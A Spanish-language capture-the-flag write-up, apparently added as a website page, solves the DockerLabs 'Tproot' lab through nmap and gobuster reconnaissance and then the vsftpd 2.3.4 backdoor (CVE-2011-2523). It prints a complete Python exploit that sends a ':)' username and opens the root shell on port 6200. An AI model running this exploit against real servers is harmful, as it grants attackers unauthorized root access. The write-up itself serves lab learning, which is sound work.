@@ -1,0 +1,225 @@
+---
+title: Tproot
+description: Resolución completa de la máquina virtual *Tproot* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Tproot**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
+El laboratorio expone un servicio FTP vulnerable a la vulnerabilidad **CVE-2011-2523** (backdoor en vsftpd 2.3.4), que permite la ejecución remota de comandos mediante el envío de un carácter especial como nombre de usuario. 
+Al activar la vulnerabilidad, se abre una shell en el puerto 6200. Debido a que la conexión directa no es posible, se utiliza un script adaptado de ExploitDB para obtener acceso a la shell, la cual se ejecuta directamente como usuario `root` sin necesidad de escalada de privilegios adicional.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Tproot',
+    Autor: 'd1se0',
+    Dificultad: 'Muy Fácil',
+    Fecha: '10/02/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Tproot.zip
+sudo bash auto_deplo.sh Tproot.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Tproot/{content,exploits,nmap,scripts}
+cd Tproot
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **80/tcp** — HTTP
+
+![Puertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748677565/Ports_meokit.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,80 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1748677565/Services_qh01ht.png)
+
+El escaneo revela que el servicio FTP está ejecutando `vsftpd 2.3.4`, una versión conocida por ser vulnerable a una backdoor que permite ejecución remota de comandos (**CVE-2011-2523**).
+
+Se realiza un escaneo específico para confirmar la vulnerabilidad:
+
+```bash
+nmap -p21 --script vuln 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1748677565/Gobuster_ybe2zi.png)
+
+El resultado muestra únicamente un `index.html` sin vulnerabilidades aparentes. Se trata de la página por defecto de Apache.
+
+![index apache](https://res.cloudinary.com/dewqswzke/image/upload/v1748677565/Web_uumbl1.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+La vulnerabilidad **CVE-2011-2523** afecta a `vsftpd 2.3.4` y permite la ejecución remota de comandos. Al conectarse al servicio FTP y proporcionar `:)` como nombre de usuario, se activa una shell de administración en el puerto 6200.
+
+Debido a que la conexión directa a la shell no es posible, se utiliza un script adaptado de [ExploitDB](https://www.exploit-db.com/exploits/49757):
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+import asyncio
+from signal import signal, SIGINT
+from sys import exit
+from telnetlib3 import open_connection
+
+def handler(signal_received, frame):
+    print('[+] Saliendo...')
+    exit(0)
+
+signal(SIGINT, handler)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("host", help="Dirección IP del host vulnerable", type=str)
+args = parser.parse_args()
+host = args.host
+portFTP = 21
+
+user = "USER nergal:)"
+password = "PASS pass"
+
+async def main():
+    reader, writer = await open_connection(host, portFTP)
+    writer.write(user + '\n')
+    await writer.drain()
+    print(await reader.read(1024))
+
+    writer.write(password + '\n')
+    await writer.drain()
+    print(await reader.read(1024))
+
+    try:
+        reader2, writer2 = await open_connection(host, 6200)
+        print('Shell abierta en el puerto 6200. Usa `exit` para salir.')
+        while True:
+            command = input("shell> ")
+            if command.strip().lower() == "exit":
+                break
+            writer2.write(command + '\n')
+            await writer2.drain()
+            print(await reader2.read(4096))
+        writer2.close()
+        await writer2.wait_closed()
+    except Exception as e:
+        print(f"[!] Error al conectar al puerto 6200: {e}")
+
+    writer.close()
+    await writer.wait_closed()
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+Se ejecuta el script:
+
+```bash
+python3 script.py 172.17.0.2
+```
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+No es necesaria la escalada de privilegios, ya que se ha obtenido acceso directamente como usuario `root` a través de la backdoor.
+
+![Root acceso](https://res.cloudinary.com/dewqswzke/image/upload/v1748677565/Root_cqmywc.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Backdoor en vsftpd 2.3.4 (CVE-2011-2523)",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como root"
+    },
+    {
+      vulnerability: "Puerto 6200 abierto sin autenticación",
+      severity: "Crítica",
+      impact: "Acceso directo a shell como administrador"
+    },
+    {
+      vulnerability: "Servicio FTP expuesto públicamente",
+      severity: "Alta",
+      impact: "Vector de ataque accesible desde la red"
+    },
+    {
+      vulnerability: "Falta de actualizaciones de seguridad",
+      severity: "Alta",
+      impact: "Vulnerabilidad conocida sin parchear"
+    },
+    {
+      vulnerability: "Uso de software obsoleto",
+      severity: "Media",
+      impact: "Múltiples vulnerabilidades potenciales"
+    }
+  ]}
+/>
